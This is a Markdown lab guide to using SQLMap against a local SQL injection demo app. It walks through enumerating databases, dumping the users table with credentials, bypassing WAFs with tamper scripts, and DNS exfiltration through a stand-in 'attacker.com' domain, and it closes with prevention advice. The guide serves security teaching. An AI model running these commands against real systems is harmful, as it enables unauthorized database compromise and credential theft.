# SQLMap Guide for SQL Injection Testing

This guide provides detailed instructions on how to use SQLMap to automatically detect and exploit SQL injection vulnerabilities in the demo application.

## Prerequisites

1. SQLMap installed (can be installed via `pip install sqlmap` or downloaded from [sqlmap.org](http://sqlmap.org/))
2. The SQL injection demo application running on localhost:5000
3. Basic understanding of SQL injection concepts

## Basic SQLMap Usage

### 1. Detecting SQL Injection

Start with a basic detection scan to confirm if the endpoint is vulnerable:

```bash
sqlmap -u "http://localhost:5000/user?id=1" --batch
```

Parameters explained:
- `-u`: Target URL with the parameter to test
- `--batch`: Non-interactive mode, automatically answers all questions with default values

### 2. Database Enumeration

Once vulnerability is confirmed, enumerate available databases:

```bash
sqlmap -u "http://localhost:5000/user?id=1" --dbs --batch
```

Parameters explained:
- `--dbs`: Lists all available databases

### 3. Table Enumeration

Enumerate tables in the target database:

```bash
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli --tables --batch
```

Parameters explained:
- `-D demo_sqli`: Specifies the target database
- `--tables`: Lists all tables in the specified database

### 4. Column Enumeration

List columns in a specific table:

```bash
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli -T users --columns --batch
```

Parameters explained:
- `-T users`: Specifies the target table
- `--columns`: Lists all columns in the specified table

### 5. Data Extraction

Extract data from the users table:

```bash
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli -T users --dump --batch
```

Parameters explained:
- `--dump`: Extracts all data from the specified table

## Advanced SQLMap Techniques

### 1. Testing Different SQL Injection Techniques

SQLMap can attempt various techniques for exploitation:

```bash
# Boolean-based blind SQL injection
sqlmap -u "http://localhost:5000/user?id=1" --technique=B --batch

# Error-based SQL injection
sqlmap -u "http://localhost:5000/user?id=1" --technique=E --batch

# Time-based blind SQL injection
sqlmap -u "http://localhost:5000/user?id=1" --technique=T --batch

# UNION query-based SQL injection
sqlmap -u "http://localhost:5000/user?id=1" --technique=U --batch
```

Parameters explained:
- `--technique`: Specifies which techniques to use (B=boolean, E=error, T=time, U=union, S=stacked queries)

### 2. Using Custom Injection Payloads

For specific injection points or to demonstrate targeted attacks:

```bash
sqlmap -u "http://localhost:5000/user?id=1" --prefix="'" --suffix="-- " --batch
```

Parameters explained:
- `--prefix`: String to append before the injection payload
- `--suffix`: String to append after the injection payload

### 3. Testing Out-of-band SQL Injection with SQLMap

SQLMap can detect and exploit out-of-band SQL injection vulnerabilities:

```bash
sqlmap -u "http://localhost:5000/user?id=1" --technique=B --batch --dns-domain attacker.com
```

Parameters explained:
- `--dns-domain`: Domain to use for DNS exfiltration (you need to control this domain)

### 4. Bypassing WAF/IPS Protection

If the application has basic protection mechanisms:

```bash
sqlmap -u "http://localhost:5000/user?id=1" --tamper=space2comment --random-agent --batch
```

Parameters explained:
- `--tamper`: Applies transformation scripts to injection payloads (space2comment replaces spaces with comments)
- `--random-agent`: Uses a random User-Agent for each request

### 5. Data Export and Reporting

Generate detailed reports for documentation:

```bash
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli -T users --dump --batch --output-dir=./sqlmap_results --forms
```

Parameters explained:
- `--output-dir`: Directory to save results
- `--forms`: Automatically detect and test forms on the target URL

## Demo Scenarios for the Application

### Scenario 1: Full Database Compromise Demonstration

This sequence demonstrates how an attacker could progressively compromise the entire database:

```bash
# Step 1: Detect vulnerability
sqlmap -u "http://localhost:5000/user?id=1" --batch

# Step 2: Enumerate databases
sqlmap -u "http://localhost:5000/user?id=1" --dbs --batch

# Step 3: Enumerate tables in database
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli --tables --batch

# Step 4: Extract all user data including credentials
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli -T users --dump --batch
```

### Scenario 2: Comparing Vulnerable vs. Secure Endpoints

Demonstrate the difference between the vulnerable and secure implementations:

```bash
# Test the vulnerable endpoint
sqlmap -u "http://localhost:5000/user?id=1" --batch --dbs

# Test the secure endpoint
sqlmap -u "http://localhost:5000/secure-user?id=1" --batch --dbs
```

The secure endpoint should show no vulnerabilities detected.

### Scenario 3: Testing Different SQL Injection Types

```bash
# Test for UNION-based SQL injection specifically
sqlmap -u "http://localhost:5000/user?id=1" --technique=U --banner --batch

# Test for time-based blind SQL injection
sqlmap -u "http://localhost:5000/user?id=1" --technique=T --batch
```

## SQLMap Performance Optimization

For faster demonstrations or when testing in time-limited scenarios:

```bash
# Use a lower level of tests (faster but may miss some vulnerabilities)
sqlmap -u "http://localhost:5000/user?id=1" --level=1 --batch

# Reduce the number of threads
sqlmap -u "http://localhost:5000/user?id=1" --threads=3 --batch
```

## Troubleshooting SQLMap Issues

**SQLMap not detecting vulnerabilities:**
```bash
# Try increasing the level and risk
sqlmap -u "http://localhost:5000/user?id=1" --level=5 --risk=3 --batch
```

**SQLMap execution too slow:**
```bash
# Optimize for speed
sqlmap -u "http://localhost:5000/user?id=1" --smart --batch
```

**Parameters being incorrectly identified:**
```bash
# Specify the parameter to test
sqlmap -u "http://localhost:5000/user?id=1" -p id --batch
```

## Educational Context

Remember to emphasize these points when demonstrating SQLMap:

1. SQLMap is a penetration testing tool meant for authorized security assessments
2. Unauthorized use against systems you don't own is illegal
3. The techniques demonstrated are for educational purposes only
4. Always highlight how proper input validation and parameterized queries prevent these attacks

## Best Practices for SQL Injection Prevention

After demonstrating the vulnerabilities, show how to prevent them:

1. Use parameterized queries or prepared statements
2. Implement proper input validation
3. Follow the principle of least privilege for database accounts
4. Use modern ORM frameworks that handle SQL securely
5. Implement proper error handling that doesn't expose database details
